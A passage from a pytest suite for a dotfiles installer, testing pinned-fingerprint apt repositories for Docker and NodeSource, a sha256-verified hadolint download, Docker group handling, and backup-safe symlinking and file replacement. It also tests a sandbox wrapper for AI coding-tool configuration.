            if c.endswith(" /etc/apt/keyrings/demo.gpg") and "show-keys" not in c
        ], shell_env.calls
        assert "sources.list.d" not in self._tee_log(shell_env)
        assert not [c for c in shell_env.calls if "apt-get update" in c]

    def test_a_failed_key_download_adds_nothing(self, shell_env):
        shell_env.stub("curl", exit_code=22)
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        shell_env.stub("gpg")  # present, so the failure is the download's
        res = run_sourced(self.REPO.format(fpr=_OTHER_FPR), shell_env.env)
        assert re.search(r"^NOT_ADDED rc=1$", res.stdout, re.M), res.stdout
        assert "Failed to fetch the Demo signing key" in res.stdout
        assert "sources.list.d" not in self._tee_log(shell_env)
        # A failed download leaves an existing keyring as it was.
        assert "sudo rm -f /etc/apt/keyrings/demo.gpg.new" in shell_env.calls
        assert not [c for c in shell_env.calls if c.startswith("sudo mv")]

    def _docker(self, shell_env, os_release, gpg=None):
        shell_env.stub("curl")
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        shell_env.stub("dpkg", body="echo amd64")
        shell_env.stub("gpg", body=gpg or _gpg_shows(_pin("DOCKER_APT_KEY_FPR")))
        return run_recording(
            _absent("docker") + os_release + "OS=ubuntu install_docker", shell_env.env
        )

    @pytest.mark.parametrize(
        ("os_release", "distro", "codename"),
        [
            pytest.param(_UBUNTU_NOBLE, "ubuntu", "noble", id="ubuntu"),
            pytest.param(
                _os_release("ID=debian", "VERSION_CODENAME=bookworm"),
                "debian",
                "bookworm",
                id="debian",
            ),
            pytest.param(
                _os_release(
                    "ID=linuxmint", 'ID_LIKE="ubuntu debian"', "UBUNTU_CODENAME=noble"
                ),
                "ubuntu",
                "noble",
                id="ubuntu-derivative",
            ),
        ],
    )
    def test_docker_engine_comes_from_dockers_signed_repo(
        self, shell_env, os_release, distro, codename
    ):
        res, failures = self._docker(shell_env, os_release)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == [], res.stdout
        log = self._tee_log(shell_env)
        assert (
            "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.asc] "
            f"https://download.docker.com/linux/{distro} {codename} stable"
        ) in log, log
        # Stored as served (armored), the way upstream's docker.asc is.
        assert "## tee /etc/apt/keyrings/docker.asc.new\n" in log
        assert (
            "sudo mv -f /etc/apt/keyrings/docker.asc.new /etc/apt/keyrings/docker.asc"
            in shell_env.calls
        )
        assert (
            f"curl -fsSL https://download.docker.com/linux/{distro}/gpg"
            in shell_env.calls
        )
        assert (
            "sudo apt-get install -y docker-ce docker-ce-cli containerd.io "
            "docker-buildx-plugin docker-compose-plugin"
        ) in shell_env.calls

    def test_an_unknown_release_installs_no_engine(self, shell_env):
        res, failures = self._docker(shell_env, _os_release("ID=arch"))
        assert failures == ["Docker engine"], res.stdout
        assert "Could not tell the Debian/Ubuntu release" in res.stdout
        assert not [c for c in shell_env.calls if c.startswith("curl")]
        assert not [c for c in shell_env.calls if "docker-ce" in c]

    def test_a_docker_key_mismatch_installs_no_engine(self, shell_env):
        res, failures = self._docker(
            shell_env, _UBUNTU_NOBLE, gpg=_gpg_shows(_OTHER_FPR)
        )
        assert failures == ["Docker engine"], res.stdout
        assert not [c for c in shell_env.calls if "docker-ce" in c]
        assert not [c for c in shell_env.calls if "usermod" in c]

    def test_nodejs_comes_from_the_signed_nodesource_repo(self, shell_env):
        shell_env.stub("curl")
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        shell_env.stub("gpg", body=_gpg_shows(_pin("NODESOURCE_APT_KEY_FPR")))
        res, failures = run_recording(
            _absent("node", "npm") + "OS=ubuntu install_nodejs", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == [], res.stdout
        major = _pin("NODESOURCE_NODE_MAJOR")
        assert re.fullmatch(r"\d+", major)
        assert (
            "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] "
            f"https://deb.nodesource.com/node_{major}.x nodistro main"
        ) in self._tee_log(shell_env)
        assert (
            "curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key"
            in shell_env.calls
        )
        assert "sudo apt-get install -y nodejs" in shell_env.calls
        assert not [
            c for c in shell_env.calls if c.startswith(("sudo -E", "sudo bash"))
        ]


@pytest.fixture(scope="module")
def real_gpg_keys(tmp_path_factory):
    """Two real OpenPGP keys (each a primary key plus an encryption subkey),
    exported armored and dearmored, made in a throwaway GNUPGHOME.

    TestSignedAptRepos stubs gpg with hand-written colon records; this is the
    one place `_keyring_primary_fprs` meets what gpg really prints.
    """
    if shutil.which("gpg") is None:
        pytest.skip("gpg is not installed")

    def gpg(env, *args):
        return subprocess.run(
            ["gpg", "--batch", "--no-tty", "--pinentry-mode", "loopback", *args],
            capture_output=True,
            env=env,
            timeout=120,
        )

    def fprs_after(env, record):
        """Fingerprints of the keys whose `fpr` record follows a `record` line."""
        lines = gpg(env, "--with-colons", "--list-keys").stdout.decode().splitlines()
        return [
            ln.split(":")[9]
            for prev, ln in zip(lines, lines[1:])
            if prev.startswith(record + ":") and ln.startswith("fpr:")
        ]

    # gpg-agent's socket lives in GNUPGHOME and a unix socket path is capped at
    # ~104 bytes: pytest's tmp_path stays under that on Linux, but not always on
    # macOS, where a short directory is the fallback.
    tried: list = []
    env = None
    reason = b""
    try:
        for make_home in (
            lambda: tmp_path_factory.mktemp("gnupg"),
            lambda: Path(tempfile.mkdtemp(prefix="gh", dir="/tmp")),  # nosec B108
        ):
            home = make_home()
            tried.append(home)
            home.chmod(0o700)
            candidate = {**os.environ, "GNUPGHOME": str(home)}
            res = gpg(
                candidate,
                "--passphrase",
                "",
                "--quick-generate-key",
                "alpha <alpha@example.test>",
                "ed25519",
                "sign",
                "never",
            )
            if res.returncode == 0:
                env = candidate
                break
            reason = res.stderr
        if env is None:
            pytest.skip(f"gpg cannot make a key here: {reason.decode()[-300:]}")

        res = gpg(
            env,
            "--passphrase",
            "",
            "--quick-generate-key",
            "beta <beta@example.test>",
            "ed25519",
            "sign",
            "never",
        )
        assert res.returncode == 0, res.stderr.decode()
        primaries = fprs_after(env, "pub")
        assert len(primaries) == 2, primaries
        for fpr in primaries:
            res = gpg(
                env,
                "--passphrase",
                "",
                "--quick-add-key",
                fpr,
                "cv25519",
                "encr",
                "never",
            )
            assert res.returncode == 0, res.stderr.decode()
        subkeys = fprs_after(env, "sub")
        assert len(subkeys) == 2, subkeys
        out = tmp_path_factory.mktemp("keys")
        files = {}
        for name, fprs, armor in (
            ("one.asc", primaries[:1], True),
            ("one.gpg", primaries[:1], False),
            ("two.asc", primaries, True),
            ("two.gpg", primaries, False),
        ):
            res = gpg(env, *(["--armor"] if armor else []), "--export", *fprs)
            assert res.returncode == 0 and res.stdout, res.stderr.decode()
            (out / name).write_bytes(res.stdout)
            files[name] = out / name
        yield {"files": files, "primaries": primaries, "subkeys": subkeys}
    finally:
        for home in tried:
            subprocess.run(
                ["gpgconf", "--kill", "gpg-agent"],
                env={**os.environ, "GNUPGHOME": str(home)},
                check=False,
                capture_output=True,
            )
        for home in tried[1:]:  # the pytest-made one is pytest's to remove
            shutil.rmtree(home, ignore_errors=True)


@pytest.mark.skipif(shutil.which("gpg") is None, reason="gpg is not installed")
class TestKeyringPrimaryFprsWithRealGpg:
    """`_keyring_primary_fprs` on what a real gpg prints for real keys, armored
    and dearmored: the primary key's fingerprint only, never a subkey's."""

    def _fprs(self, shell_env, path):
        res = run_sourced(f'_keyring_primary_fprs "{path}"', shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        return res.stdout.split()

    @pytest.mark.parametrize("suffix", ["asc", "gpg"], ids=["armored", "dearmored"])
    def test_a_key_with_a_subkey_yields_its_primary_fingerprint_alone(
        self, shell_env, real_gpg_keys, suffix
    ):
        path = real_gpg_keys["files"][f"one.{suffix}"]
        assert self._fprs(shell_env, path) == real_gpg_keys["primaries"][:1]

    @pytest.mark.parametrize("suffix", ["asc", "gpg"], ids=["armored", "dearmored"])
    def test_two_keys_yield_both_primaries_in_file_order(
        self, shell_env, real_gpg_keys, suffix
    ):
        path = real_gpg_keys["files"][f"two.{suffix}"]
        assert self._fprs(shell_env, path) == real_gpg_keys["primaries"]

    def test_the_raw_listing_does_contain_the_subkey_fingerprint(
        self, shell_env, real_gpg_keys
    ):
        # Otherwise the two tests above would pass for any awk: the subkey's
        # `fpr` record really is in gpg's output, and has to be skipped.
        home = shell_env.home.parent / "raw-gnupg"
        home.mkdir(mode=0o700)
        raw = subprocess.run(
            [
                "gpg",
                "--batch",
                "--show-keys",
                "--with-colons",
                str(real_gpg_keys["files"]["one.asc"]),
            ],
            capture_output=True,
            text=True,
            env={**shell_env.env, "GNUPGHOME": str(home)},
            timeout=60,
        )
        fprs = [ln.split(":")[9] for ln in raw.stdout.splitlines() if ln[:4] == "fpr:"]
        assert real_gpg_keys["subkeys"][0] in fprs
        assert real_gpg_keys["primaries"][0] in fprs

    def test_a_file_gpg_cannot_read_fails_instead_of_printing_nothing(
        self, shell_env, tmp_path
    ):
        junk = tmp_path / "not-a-key"
        junk.write_text("this is not OpenPGP data\n", encoding="utf-8")
        res = run_sourced(
            f'_keyring_primary_fprs "{junk}" && echo OK || echo "FAILED rc=$?"',
            shell_env.env,
        )
        assert "FAILED rc=1" in res.stdout, res.stdout + res.stderr

    def test_the_wrapper_accepts_the_real_key_only_with_its_pinned_fingerprint(
        self, shell_env, real_gpg_keys
    ):
        """_add_signed_apt_repo end to end on a real key: sudo is the one stub (it
        stands in for root and lets the staged key be a real file the real gpg
        reads); curl hands over the real exported key."""
        good, other = real_gpg_keys["primaries"]
        keyfile = real_gpg_keys["files"]["one.asc"]
        tee_log = shell_env.home / "tee.log"

        def run(want, keyring_name):
            keyring = shell_env.home / f"{keyring_name}.asc"
            # `sudo` runs its arguments as the user; the staged file is then a
            # real file in the user's own directory, as it is for root. The one
            # write that would land outside HOME (the sources entry, under /etc)
            # is only logged, never made -- and a failing command's status is
            # kept (a stub's trailing `exit 0` would hide it).
            shell_env.stub(
                "sudo",
                body=(
                    'case "$1 $2" in "tee /etc/"*) '
                    '{ echo "## $*"; cat; } >>"$HOME/tee.log"; exit 0 ;; esac\n'
                    '"$@"\nexit $?'
                ),
            )
            shell_env.stub("curl", body=f'cat "{keyfile}"')
            return run_sourced(
                f'_add_signed_apt_repo Real https://example.test/key "{keyring}" '
                f'{want} real.list "deb [signed-by={keyring}] https://example.test s m"'
                ' && echo ADDED || echo "NOT_ADDED rc=$?"',
                shell_env.env,
            ), keyring

        res, keyring = run(good, "good")
        assert "ADDED" in res.stdout and "NOT_ADDED" not in res.stdout, res.stdout
        assert keyring.is_file() and not Path(f"{keyring}.new").exists()
        assert stat.S_IMODE(keyring.stat().st_mode) == 0o644
        # the sources entry was written (to the log) only because the key passed
        added = tee_log.read_text(encoding="utf-8")
        assert "## tee /etc/apt/sources.list.d/real.list\n" in added
        assert f"deb [signed-by={keyring}] https://example.test s m" in added

        res, keyring = run(other, "bad")
        assert re.search(r"^NOT_ADDED rc=1$", res.stdout, re.M), res.stdout
        assert "does not match" in res.stdout
        assert not keyring.exists() and not Path(f"{keyring}.new").exists()
        assert tee_log.read_text(encoding="utf-8") == added  # nothing more written


class TestDockerDesktopOnMacos:
    """Docker Desktop is detected by its cask (or app), not by the CLI, which
    stays off PATH until the app has been launched once."""

    def _run(self, shell_env, snippet):
        res, failures = run_recording(
            snippet + "OS=macos install_docker", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        installs = [c for c in shell_env.calls if c.startswith("brew install")]
        return res, failures, installs

    @pytest.mark.parametrize("cask", ["docker-desktop", "docker"])
    def test_an_installed_cask_is_not_reinstalled(self, shell_env, cask):
        shell_env.stub("brew", body=_brew_casks(cask))
        res, failures, installs = self._run(shell_env, _absent("docker") + _DD_ABSENT)
        assert installs == []
        assert failures == []
        assert "Docker Desktop already installed" in res.stdout
        # Installed but never launched: say what is still missing.
        assert "Launch Docker Desktop once" in res.stdout

    def test_an_app_installed_outside_brew_is_recognised(self, shell_env, tmp_path):
        app = tmp_path / "Docker.app"
        app.mkdir()
        shell_env.stub("brew", body=_brew_casks())
        res, failures, installs = self._run(
            shell_env, _absent("docker") + f'DOCKER_DESKTOP_APP="{app}"; '
        )
        assert installs == []
        assert failures == []
        assert "Docker Desktop already installed" in res.stdout

    def test_another_docker_runtime_is_left_alone(self, shell_env):
        # OrbStack / Colima put a docker CLI on PATH without Docker Desktop.
        shell_env.stub("brew", body=_brew_casks())
        shell_env.stub("docker")
        res, failures, installs = self._run(shell_env, _DD_ABSENT)
        assert installs == []
        assert failures == []
        assert "not installing Docker Desktop" in res.stdout

    def test_a_missing_docker_desktop_is_installed_with_the_current_cask(
        self, shell_env
    ):
        shell_env.stub("brew", body=_brew_casks())
        res, failures, installs = self._run(shell_env, _absent("docker") + _DD_ABSENT)
        assert installs == ["brew install --cask docker-desktop"]
        assert failures == []
        assert "Launch Docker Desktop once" in res.stdout


class TestDockerOnUbuntu:
    """Group membership via `id -un` (never $USER), only once an engine is
    there, re-added on a rerun when missing; `docker info` is a warning only."""

    def _engine(self, shell_env, *, groups="alice sudo", docker_group=True, info_rc=0):
        shell_env.stub("docker", body=f'[ "$1" = info ] && exit {info_rc}')
        shell_env.stub(
            "id",
            body=f'case "$1" in -un) echo alice ;; -nG) echo "{groups}" ;; esac',
        )
        getent = 'echo "docker:x:999:"; exit 0' if docker_group else "exit 2"
        shell_env.stub(
            "getent", body=f'[ "$1 $2" = "group docker" ] && {{ {getent}; }}\nexit 2'
        )

    def _run(self, shell_env, snippet="OS=ubuntu install_docker"):
        env = {**shell_env.env, "USER": "mallory"}
        res, failures = run_recording(snippet, env)
        assert res.returncode == 0, res.stdout + res.stderr
        return res, failures, [c for c in shell_env.calls if "usermod" in c]

    def test_a_user_missing_from_the_group_is_added_on_a_rerun(self, shell_env):
        self._engine(shell_env)
        res, failures, usermods = self._run(shell_env)
        assert usermods == ["sudo usermod -aG docker alice"]
        assert failures == []
        assert "newgrp docker" in res.stdout

    def test_a_user_already_in_the_group_is_not_re_added(self, shell_env):
        self._engine(shell_env, groups="alice sudo docker")
        _, failures, usermods = self._run(shell_env)
        assert usermods == []
        assert failures == []

    def test_no_docker_group_means_no_group_change(self, shell_env):
        self._engine(shell_env, docker_group=False)
        _, failures, usermods = self._run(shell_env)
        assert usermods == []
        assert failures == []

    def test_a_failed_usermod_is_recorded(self, shell_env):
        self._engine(shell_env)
        shell_env.stub("sudo", body=_fails_on("*usermod*"))
        _, failures, _ = self._run(shell_env)
        assert failures == ["docker group"]

    def test_a_failed_engine_install_changes_no_group(self, shell_env):
        self._engine(shell_env)
        shell_env.stub("curl", exit_code=22)
        _, failures, usermods = self._run(
            shell_env, _absent("docker") + _UBUNTU_NOBLE + "OS=ubuntu install_docker"
        )
        assert failures == ["Docker engine"]
        assert usermods == []

    @pytest.mark.parametrize("os_name", ["ubuntu", "macos"])
    def test_an_unreachable_daemon_warns_without_failing(self, shell_env, os_name):
        self._engine(shell_env, groups="alice docker", info_rc=1)
        shell_env.stub("brew", body=_brew_casks("docker-desktop"))
        res, failures, _ = self._run(shell_env, f"OS={os_name} install_docker")
        assert failures == []
        assert any(
            "[WARNING]" in ln and "docker info" in ln for ln in res.stdout.splitlines()
        ), res.stdout

    def test_a_reachable_daemon_is_reported(self, shell_env):
        self._engine(shell_env, groups="alice docker")
        res, failures, _ = self._run(shell_env)
        assert failures == []
        assert "Docker daemon is reachable" in res.stdout


_HADOLINT_FAKE = b"fake hadolint binary\n"
# curl stub: write _HADOLINT_FAKE to the `-o` target, like a finished download.
_CURL_WRITES_HADOLINT = (
    'out=""; prev=""\n'
    'for a in "$@"; do [ "$prev" = "-o" ] && out="$a"; prev="$a"; done\n'
    '[ -n "$out" ] && printf \'fake hadolint binary\\n\' >"$out"'
)


class TestInstallHadolint:
    """hadolint: brew on macOS; a pinned release binary verified by sha256 on
    Ubuntu, installed as the user into ~/.local/bin; skipped when present."""

    def _sha(self):
        import hashlib

        return hashlib.sha256(_HADOLINT_FAKE).hexdigest()

    def _ubuntu(self, shell_env, machine="x86_64", pins=True, hide_sha256sum=False):
        shell_env.stub("uname", body=f'[ "$1" = -m ] && echo {machine}')
        shell_env.stub("curl", body=_CURL_WRITES_HADOLINT)
        if hide_sha256sum:
            shell_env.hide("sha256sum")
        prefix = _absent("hadolint")
        if pins:
            prefix += f"HADOLINT_SHA256_X86_64={self._sha()}; HADOLINT_SHA256_ARM64={self._sha()}; "
        res, failures = run_recording(
            prefix + "OS=ubuntu install_hadolint", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        return res, failures

    def test_an_installed_hadolint_is_left_alone(self, shell_env):
        shell_env.stub("hadolint")
        res, failures = run_recording("OS=ubuntu install_hadolint", shell_env.env)
        assert "hadolint already installed" in res.stdout
        assert failures == []
        assert not [c for c in shell_env.calls if c.startswith(("curl", "brew"))]

    def test_a_binary_in_local_bin_is_found_without_it_being_on_path(self, shell_env):
        # A rerun from a shell whose PATH lacks ~/.local/bin must not download
        # (and sha256-check) the release again just because the first run put
        # it there.
        binary = shell_env.home / ".local/bin/hadolint"
        binary.parent.mkdir(parents=True)
        binary.write_bytes(_HADOLINT_FAKE)
        binary.chmod(0o755)
        shell_env.stub("curl", body=_CURL_WRITES_HADOLINT)
        res, failures = run_recording(
            _absent("hadolint") + "OS=ubuntu install_hadolint", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "hadolint already installed" in res.stdout
        assert failures == []
        assert not [c for c in shell_env.calls if c.startswith(("curl", "brew"))]

    def test_a_non_executable_file_in_local_bin_does_not_count(self, shell_env):
        binary = shell_env.home / ".local/bin/hadolint"
        binary.parent.mkdir(parents=True)
        binary.write_bytes(b"not runnable")
        binary.chmod(0o644)
        res, failures = self._ubuntu(shell_env)
        assert failures == [], res.stdout
        assert any(c.startswith("curl ") for c in shell_env.calls)

    def test_macos_installs_it_with_brew(self, shell_env):
        res, failures = run_recording(
            _absent("hadolint") + "OS=macos install_hadolint", shell_env.env
        )
        assert "brew install hadolint" in shell_env.calls
        assert failures == []

    @pytest.mark.parametrize(
        ("machine", "asset"),
        [("x86_64", "hadolint-linux-x86_64"), ("aarch64", "hadolint-linux-arm64")],
    )
    @pytest.mark.parametrize(
        "hide_sha256sum", [False, True], ids=["sha256sum", "shasum"]
    )
    def test_ubuntu_installs_the_verified_release_binary(
        self, shell_env, machine, asset, hide_sha256sum
    ):
        res, failures = self._ubuntu(shell_env, machine, hide_sha256sum=hide_sha256sum)
        assert failures == [], res.stdout
        url = (
            "https://github.com/hadolint/hadolint/releases/download/"
            f"v{_pin('HADOLINT_VERSION')}/{asset}"
        )
        assert any(c.startswith(f"curl -fsSL {url} ") for c in shell_env.calls), (
            shell_env.calls
        )
        binary = shell_env.home / ".local/bin/hadolint"
        assert binary.read_bytes() == _HADOLINT_FAKE
        assert os.access(binary, os.X_OK)

    def test_a_checksum_mismatch_installs_nothing_and_is_recorded(self, shell_env):
        res, failures = self._ubuntu(shell_env, pins=False)
        assert failures == ["hadolint"]
        assert "checksum" in res.stdout
        assert not (shell_env.home / ".local/bin/hadolint").exists()

    def test_a_failed_download_is_recorded(self, shell_env):
        shell_env.stub("uname", body='[ "$1" = -m ] && echo x86_64')
        shell_env.stub("curl", exit_code=22)
        res, failures = run_recording(
            _absent("hadolint") + "OS=ubuntu install_hadolint", shell_env.env
        )
        assert failures == ["hadolint"]
        assert not (shell_env.home / ".local/bin/hadolint").exists()

    def test_an_architecture_without_a_release_is_a_warning(self, shell_env):
        res, failures = self._ubuntu(shell_env, machine="riscv64")
        assert failures == []
        assert "riscv64" in res.stdout
        assert not [c for c in shell_env.calls if c.startswith("curl")]

    def test_the_pins_are_exact(self):
        assert re.fullmatch(r"\d+\.\d+\.\d+", _pin("HADOLINT_VERSION"))
        for var in ("HADOLINT_SHA256_X86_64", "HADOLINT_SHA256_ARM64"):
            assert re.fullmatch(r"[0-9a-f]{64}", _pin(var)), var
        for var in ("DOCKER_APT_KEY_FPR", "NODESOURCE_APT_KEY_FPR"):
            assert re.fullmatch(r"[0-9A-F]{40}", _pin(var)), var


class TestLinksAreIdempotent:
    """A correct link is left in place; a link pointing elsewhere has its
    old target recorded in the backup dir before it is replaced."""

    def test_a_correct_link_is_not_recreated(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        assert run_sourced("create_symlinks", shell_env.env).returncode == 0
        before = os.lstat(home / ".zshrc")

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Already linked .zshrc" in res.stdout
        assert "Linked .zshrc" not in res.stdout.replace("Already linked .zshrc", "")
        after = os.lstat(home / ".zshrc")
        assert (after.st_ino, after.st_ctime_ns) == (before.st_ino, before.st_ctime_ns)

    def test_dry_run_tells_a_correct_link_from_one_it_would_replace(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        assert run_sourced("create_symlinks", shell_env.env).returncode == 0
        (home / ".vimrc").unlink()
        (home / ".vimrc").symlink_to("/opt/stow/vim/.vimrc")

        res = run_sourced("create_symlinks", {**shell_env.env, "DRY_RUN": "1"})
        assert res.returncode == 0, res.stderr
        assert (
            f"[DRY-RUN] already linked {home}/.zshrc -> {REPO_ROOT}/.zshrc"
            in res.stdout
        )
        assert (
            f"[DRY-RUN] would replace existing symlink {home}/.vimrc "
            "(was -> /opt/stow/vim/.vimrc)"
        ) in res.stdout
        assert os.readlink(home / ".vimrc") == "/opt/stow/vim/.vimrc"

    def test_a_foreign_link_is_recorded_before_it_is_replaced(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".zshrc").symlink_to("/opt/stow/zsh/.zshrc")

        res, failures = run_recording("create_symlinks </dev/null", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        assert os.readlink(home / ".zshrc") == f"{REPO_ROOT}/.zshrc"
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1, res.stdout
        record = (backups[0] / "symlinks.txt").read_text(encoding="utf-8")
        assert f"{home}/.zshrc -> /opt/stow/zsh/.zshrc\n" in record

    def test_a_link_replaced_after_the_backup_dir_was_tidied_is_still_recorded(
        self, shell_env
    ):
        # create_symlinks removes an empty backup dir; link_oh_my_zsh_theme
        # runs after it and may still replace a link.
        home = shell_env.home
        themes = home / ".oh-my-zsh/custom/themes"
        themes.mkdir(parents=True)
        (themes / "px-rose-pine.zsh-theme").symlink_to("/opt/elsewhere/theme")

        res, failures = run_recording(
            'backup_dir="$HOME/.dotfiles_backup_later"; link_oh_my_zsh_theme',
            shell_env.env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        record = home / ".dotfiles_backup_later/symlinks.txt"
        assert "-> /opt/elsewhere/theme" in record.read_text(encoding="utf-8")


class TestLinkStepFailuresAreRecorded:
    """A write that fails inside create_symlinks is a recorded failure and
    linking carries on, instead of a bare abort with no failure summary."""

    def test_a_failed_ln_is_recorded_and_linking_continues(self, shell_env):
        (shell_env.home / ".oh-my-zsh").mkdir()
        res, failures = run_recording(
            "ln() { return 1; }; create_symlinks </dev/null", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert f"link {shell_env.home}/.zshrc" in failures, failures
        # A step after the links still ran.
        assert (shell_env.home / ".codex/hooks.json").is_file()

    def test_a_failed_backup_is_recorded_and_the_file_kept(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".zshrc").write_text("mine\n", encoding="utf-8")
        res, failures = run_recording(
            'mv() { case "$1" in */.zshrc) return 1 ;; esac; command mv "$@"; }; '
            "create_symlinks </dev/null",
            shell_env.env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert f"link {home}/.zshrc" in failures, failures
        assert (home / ".zshrc").read_text(encoding="utf-8") == "mine\n"
        assert (home / ".vimrc").is_symlink()

    @pytest.mark.parametrize(
        ("rel", "label", "linked_later"),
        [
            (".claude", "Claude config links", ".codex/AGENTS.md"),
            (".codex", "Codex config links", ".gemini/GEMINI.md"),
            (".gemini", "Gemini config links", ".tmux/tmux_send_to_all_except_nvim.sh"),
            # the last link step: nothing after it to check (csb is written by
            # its own, later step -- see TestSandboxCliWrapper)
            (".tmux", "tmux helper link", None),
        ],
    )
    def test_an_unusable_config_dir_is_recorded_and_linking_continues(
        self, shell_env, rel, label, linked_later
    ):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / rel).write_text("a file where a directory belongs\n", encoding="utf-8")
        res, failures = run_recording("create_symlinks </dev/null", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert label in failures, failures
        if linked_later is not None:
            assert (home / linked_later).is_symlink()

    def test_dry_run_announces_replacing_a_dangling_gemini_dir(self, shell_env):
        home = shell_env.home
        (home / ".gemini").symlink_to("/nonexistent/gemini")
        res = run_sourced("create_symlinks", {**shell_env.env, "DRY_RUN": "1"})
        assert res.returncode == 0, res.stderr
        assert (
            f"[DRY-RUN] would replace dangling symlink {home}/.gemini with a real directory"
            in res.stdout
        )
        # Not the live-redirect warning: the real run does restrict the new dir.
        assert "Not restricting ~/.gemini" not in res.stdout
        assert "[DRY-RUN] would restrict ~/.gemini to mode 0700" in res.stdout
        assert (home / ".gemini").is_symlink()


def _mv_fails_onto(dest_glob: str) -> str:
    """Snippet prefix: `mv` fails when its LAST argument matches `dest_glob`
    and is the real mv otherwise."""
    return (
        f'mv() {{ case "${{!#}}" in {dest_glob}) return 1 ;; esac; '
        'command mv "$@"; }; '
    )


class TestReplacedFileStaysUntilTheMoveSucceeds:
    """A file that is replaced by a rename (the rendered hooks.json, the csb
    wrapper) is COPIED to the backup dir and overwritten by `mv -f`. Moving it
    away first left nothing at the path when the rename then failed."""

    _failing_mv = staticmethod(_mv_fails_onto)

    def test_a_failed_move_leaves_the_old_hooks_json_in_place(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".codex").mkdir()
        mine = home / ".codex/hooks.json"
        mine.write_text('{"mine": 1}\n', encoding="utf-8")
        res, failures = run_recording(
            self._failing_mv("*/.codex/hooks.json") + "create_symlinks </dev/null",
            shell_env.env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Codex hooks.json" in failures, failures
        assert mine.read_text(encoding="utf-8") == '{"mine": 1}\n'
        # still backed up, and no half-written temporary file is left behind
        (kept,) = home.glob(".dotfiles_backup_*/.codex/hooks.json")
        assert kept.read_text(encoding="utf-8") == '{"mine": 1}\n'
        assert [p.name for p in (home / ".codex").glob(".hooks.json.*")] == []

    def test_a_rerender_backs_up_a_copy_and_renames_over_the_old_file(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".codex").mkdir()
        (home / ".codex/hooks.json").write_text('{"mine": 1}\n', encoding="utf-8")
        snippet = (
            'mv() { printf "%s\\n" "$*" >>"$HOME/mv.log"; command mv "$@"; }; '
            "create_symlinks </dev/null"
        )
        res, failures = run_recording(snippet, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        rendered = (home / ".codex/hooks.json").read_text(encoding="utf-8")
        assert str(home) in rendered and "mine" not in rendered
        (kept,) = home.glob(".dotfiles_backup_*/.codex/hooks.json")
        assert kept.read_text(encoding="utf-8") == '{"mine": 1}\n'
        # one rename, from a temporary file in the SAME directory (so it is
        # atomic), straight over the old path
        log = (home / "mv.log").read_text(encoding="utf-8")
        assert re.search(
            rf"^-f {re.escape(str(home))}/\.codex/\.hooks\.json\.\w+ "
            rf"{re.escape(str(home))}/\.codex/hooks\.json$",
            log,
            re.M,
        ), log

    def test_a_symlinked_hooks_json_is_recorded_and_replaced(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".codex").mkdir()
        (home / ".codex/hooks.json").symlink_to("/opt/elsewhere/hooks.json")
        res, failures = run_recording("create_symlinks </dev/null", shell_env.env)
        assert failures == [], res.stdout
        rendered = home / ".codex/hooks.json"
        assert rendered.is_file() and not rendered.is_symlink()
        (record,) = home.glob(".dotfiles_backup_*/symlinks.txt")
        assert f"{rendered} -> /opt/elsewhere/hooks.json" in record.read_text()

    def test_a_failed_move_over_a_symlink_keeps_the_link(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".codex").mkdir()
        (home / ".codex/hooks.json").symlink_to("/opt/elsewhere/hooks.json")
        res, failures = run_recording(
            self._failing_mv("*/.codex/hooks.json") + "create_symlinks </dev/null",
            shell_env.env,
        )
        assert "Codex hooks.json" in failures, failures
        assert os.readlink(home / ".codex/hooks.json") == "/opt/elsewhere/hooks.json"

    def test_a_directory_in_the_way_is_still_moved_aside(self, shell_env):
        # `mv -f file dir` would drop the file INTO the directory.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".codex/hooks.json").mkdir(parents=True)
        (home / ".codex/hooks.json/inner.txt").write_text("x\n")
        res, failures = run_recording("create_symlinks </dev/null", shell_env.env)
        assert failures == [], res.stdout
        assert (home / ".codex/hooks.json").is_file()
        (kept,) = home.glob(".dotfiles_backup_*/.codex/hooks.json/inner.txt")
        assert kept.read_text() == "x\n"


class TestSandboxCliWrapper:
    """~/.local/bin/csb is a fixed three-line /bin/sh wrapper (not a symlink) that
    starts ~/.claude/hooks/claude_sandbox.py with the trusted system python3 (the
    interpreter the bash-review launchers pick), never PATH's python3.

    The text comes from `_sandbox_gate.csb_wrapper_text`, the template bash-review
    compares the file against byte for byte before it allows a csb call statically.
    A symlink let `cp x ~/.local/bin/` write through it into claude_sandbox.py.

    It is written by `_link_sandbox_cli`, which main() runs AFTER the package
